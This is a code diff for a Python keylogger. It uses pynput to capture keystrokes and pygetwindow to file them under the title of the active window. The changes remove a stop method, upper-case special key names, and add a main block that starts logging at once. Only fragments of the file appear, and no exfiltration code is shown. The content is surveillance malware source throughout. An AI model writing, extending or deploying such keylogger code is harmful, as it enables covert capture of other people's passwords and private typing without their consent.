@@ -1,6 +1,5 @@
 from pynput import keyboard
 import datetime
-import sys
 from abc import ABC,abstractmethod
 from threading import Timer
 import pygetwindow
@@ -29,7 +28,7 @@ class KeyloggerService:
             try:
                 key = key.char
             except AttributeError:
-                key = f" {str(key).replace("Key.","")} "
+                key = f" {str(key).replace("Key.","").upper()} "
         if self.get_active_window() not in self.logs:
             self.logs[self.get_active_window()] = key
         else:
@@ -39,12 +38,6 @@ class KeyloggerService:
     def on_release(self, key):
         if key == keyboard.Key.esc:
             return False
-
-
-    def stop_listener(self):
-        if self.listener:
-            self.listener.stop()
-        sys.exit(0)
 
 
     def clear_logs(self):
@@ -129,6 +122,11 @@ class KeyloggerManager:
 
 
 
+
+
+if __name__ == "__main__":
+    test = KeyloggerManager()
+    test.start_logging()
 
 
 
